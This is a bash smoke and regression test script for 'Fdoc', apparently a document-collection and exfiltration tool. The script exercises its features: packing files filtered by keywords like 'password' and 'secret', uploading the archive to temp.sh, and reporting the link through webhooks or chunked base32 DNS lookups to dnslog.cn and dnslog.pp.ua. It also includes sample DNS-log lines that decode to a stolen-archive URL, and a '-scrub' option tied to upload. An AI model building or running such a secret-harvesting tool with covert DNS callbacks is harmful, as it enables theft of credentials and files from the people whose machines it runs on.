#!/usr/bin/env bash
# Smoke + regression for Fdoc (pack, flags, callback decode, optional online upload).
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
cd "$ROOT"

BIN="${BIN:-$ROOT/build/Fdoc-smoke}"
OUT="$ROOT/build/smoke-out"
SRC="$ROOT/testdata/manual/src"
DECODE="$ROOT/scripts/dnslog_decode.py"
PASS=0
FAIL=0
ONLINE="${ONLINE:-0}"

green() { printf '\033[32m%s\033[0m\n' "$*"; }
red() { printf '\033[31m%s\033[0m\n' "$*"; }
step() { printf '\n==> %s\n' "$*"; }

ok() { green "PASS: $*"; PASS=$((PASS + 1)); }
bad() { red "FAIL: $*"; FAIL=$((FAIL + 1)); }

assert_eq() {
  local want="$1" got="$2" msg="$3"
  if [[ "$got" == "$want" ]]; then
    ok "$msg (got=$got)"
  else
    bad "$msg (want=$want got=$got)"
  fi
}

assert_contains() {
  local hay="$1" needle="$2" msg="$3"
  if [[ "$hay" == *"$needle"* ]]; then
    ok "$msg"
  else
    bad "$msg (missing '$needle')"
  fi
}

cleanup() {
  rm -rf "$OUT"
  mkdir -p "$OUT" "$(dirname "$BIN")"
}
cleanup

step "1) unit tests"
if go test ./...; then
  ok "go test ./..."
else
  bad "go test ./..."
fi

step "2) build binary"
if CGO_ENABLED=0 go build -trimpath -ldflags='-s -w' -o "$BIN" .; then
  ok "build $BIN"
else
  bad "build"
  echo "summary: $PASS passed, $FAIL failed"
  exit 1
fi

step "3) pack regression (local, no network)"
# 3a documents + skip dir
rm -f "$OUT/01-docs.tar.gz"
set +e
"$BIN" -d "$SRC" -x skipme -o "$OUT/01-docs.tar.gz" -q
ec=$?
set -e
assert_eq 0 "$ec" "pack documents exit"
if tar -tzf "$OUT/01-docs.tar.gz" | grep -q 'keep/report.pdf'; then
  ok "archive contains report.pdf"
else
  bad "archive missing report.pdf"
fi
if tar -tzf "$OUT/01-docs.tar.gz" | grep -q 'skipme/'; then
  bad "archive should not contain skipme/"
else
  ok "skipme excluded"
fi

# 3b size measure (tiny -max may truncate → exit 2; still prints totalSize)
set +e
size_out="$("$BIN" -d "$SRC" -e any -x skipme -max 100 -max-file 0 -size -q 2>&1)"
ec=$?
set -e
if [[ "$ec" -eq 0 || "$ec" -eq 2 ]]; then
  ok "size mode exit (got=$ec)"
else
  bad "size mode exit (want=0|2 got=$ec)"
fi
assert_contains "$size_out" "totalSize:" "size mode output"

# 3c truncate keep (exit 2)
rm -f "$OUT/trunc.tar.gz"
set +e
"$BIN" -d "$SRC" -e txt -x skipme -max 40 -max-file 0 -o "$OUT/trunc.tar.gz" -q
ec=$?
set -e
assert_eq 2 "$ec" "truncate exit 2"
if [[ -f "$OUT/trunc.tar.gz" ]]; then
  ok "truncated archive kept"
else
  bad "truncated archive missing"
fi

# 3d keyword filter
rm -f "$OUT/03-kw.tar.gz"
set +e
"$BIN" -d "$SRC" -e txt,ini,conf,env -x skipme -k password,secret -o "$OUT/03-kw.tar.gz" -q
ec=$?
set -e
assert_eq 0 "$ec" "keyword pack exit"

step "4) upload flag validation (no network)"
set +e
err="$("$BIN" -d "$SRC" -x skipme -o "$OUT/no-cb.tar.gz" -upload -q 2>&1)"
ec=$?
set -e
assert_eq 1 "$ec" "upload without callback exits 1"
assert_contains "$err" "webhook" "error mentions webhook/dns"

set +e
err="$("$BIN" -d "$SRC" -x skipme -size -upload -webhook http://127.0.0.1:9/ -q 2>&1)"
ec=$?
set -e
assert_eq 1 "$ec" "upload+size rejected"
assert_contains "$err" "-size" "error mentions -size"

step "5) DNS decode script (dnslog.cn + nested base)"
SAMPLE_CN=$(cat <<'EOF'
0-4-n5ydimt4knuw233omrsu2yldijxw62znkbzg6ltm.op42.ie0gyx.dnslog.cn	116.236.159.1	2026-07-20 10:05:00
1-4-n5rwc3d4nb2hi4dthixs65dfnvyc443if5sxi4lp.op42.ie0gyx.dnslog.cn	116.236.159.1	2026-07-20 10:05:00
2-4-kyxw65luob2xixzsgazdmmbxgiyf6mjqga4dgmjo.op42.ie0gyx.dnslog.cn	116.236.159.1	2026-07-20 10:05:00
3-4-orqxelthpi.op42.ie0gyx.dnslog.cn	116.236.159.1	2026-07-20 10:05:00
EOF
)
SAMPLE_UA=$(cat <<'EOF'
4	3-4-orqxelthpi.op42.8c2f0fe1.log.dnslog.pp.ua.	116.236.159.6:36162	2026-07-20 10:09:58
2	1-4-n5rwc3d4nb2hi4dthixs65dfnvyc443if5sxi4lp.op42.8c2f0fe1.log.dnslog.pp.ua.	116.236.159.38:34310	2026-07-20 10:09:58
1	2-4-kyxw65luob2xixzsgazdmmbxgiyf6mjqga4dgmjo.op42.8c2f0fe1.log.dnslog.pp.ua.	116.236.159.46:46451	2026-07-20 10:09:58
0	0-4-n5ydimt4knuw233omrsu2yldijxw62znkbzg6ltm.op42.8c2f0fe1.log.dnslog.pp.ua.	116.236.159.46:51175	2026-07-20 10:09:57
EOF
)

dec_cn="$(printf '%s\n' "$SAMPLE_CN" | python3 "$DECODE" -q)"
dec_ua="$(printf '%s\n' "$SAMPLE_UA" | python3 "$DECODE" -q)"
want_url="https://temp.sh/etqoV/output_20260720_100831.tar.gz"
assert_eq "$want_url" "$dec_cn" "decode dnslog.cn style"
assert_eq "$want_url" "$dec_ua" "decode nested dnslog.pp.ua table"

# incomplete set must fail
set +e
printf '%s\n' "$(printf '%s\n' "$SAMPLE_CN" | tail -n +2)" | python3 "$DECODE" -q >/dev/null 2>&1
ec=$?
set -e
assert_eq 1 "$ec" "decode incomplete chunks exits 1"

step "6) webhook callback smoke (local httptest via go test)"
if go test ./pkg/callback/ -run 'TestNotifyWebhook|TestDNSRoundTrip' -count=1; then
  ok "callback package smoke"
else
  bad "callback package smoke"
fi

step "7) scrub flag validation"
set +e
err="$("$BIN" -d "$SRC" -x skipme -o "$OUT/scrub-only.tar.gz" -scrub -q 2>&1)"
ec=$?
set -e
assert_eq 1 "$ec" "-scrub without -upload exits 1"
assert_contains "$err" "-upload" "error mentions -upload"

step "7b) webhook http non-loopback rejected"
set +e
err="$("$BIN" -d "$SRC" -x skipme -o "$OUT/bad-wh.tar.gz" -upload -webhook http://example.com/h -q 2>&1)"
ec=$?
set -e
assert_eq 1 "$ec" "non-loopback http webhook rejected"
assert_contains "$err" "https" "error mentions https"

step "8) online upload smoke (optional ONLINE=1)"
if [[ "$ONLINE" == "1" ]]; then
  WH_LOG="$OUT/webhook.log"
  rm -f "$OUT/online.tar.gz" "$WH_LOG"
  python3 - "$WH_LOG" <<'PY' &
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer
path = sys.argv[1]
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0"))
        body = self.rfile.read(n)
        open(path, "wb").write(body)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *a):
        pass
HTTPServer(("127.0.0.1", 18765), H).handle_request()
PY
  WH_PID=$!
  sleep 0.4
  set +e
  "$BIN" -d "$SRC" -x skipme -e pdf -o "$OUT/online.tar.gz" -upload \
    -webhook "http://127.0.0.1:18765/hook" \
    -task-id smoke1 -b temp -q
  ec=$?
  set -e
  wait "$WH_PID" 2>/dev/null || true
  if [[ "$ec" -eq 0 || "$ec" -eq 2 ]] && [[ -f "$WH_LOG" ]]; then
    if python3 -c "import json,sys; d=json.load(open(sys.argv[1])); assert d.get('url','').startswith('http'); assert d['task_id']=='smoke1'" "$WH_LOG"; then
      ok "online upload+webhook"
    else
      bad "webhook JSON invalid"
    fi
  else
    bad "online upload failed exit=$ec"
  fi
else
  ok "skip online (set ONLINE=1 to enable)"
fi

step "summary"
echo "passed=$PASS failed=$FAIL"
if [[ "$FAIL" -gt 0 ]]; then
  red "SMOKE/REGRESS FAILED"
  exit 1
fi
green "SMOKE/REGRESS OK"
